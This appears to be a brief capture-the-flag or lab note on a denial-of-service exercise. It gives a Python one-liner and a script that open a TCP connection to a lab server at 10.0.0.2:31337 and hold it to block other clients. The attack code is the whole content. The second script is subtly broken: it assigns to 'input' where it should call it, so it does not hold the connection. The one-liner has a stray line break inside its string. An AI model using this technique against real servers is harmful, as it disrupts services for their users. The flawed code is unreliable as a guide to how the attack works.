# Denial of Service 1

#### Flood the server so it cannot respond:
```
python3 -c 'import socket; s = socket.create_connection(("10.0.0.2", 31337)); input("No conn
ecting...")'
```

```python
import socket

s = socket.create_connection(("10.0.0.2", 31337))
input = ("No connecting...")
```
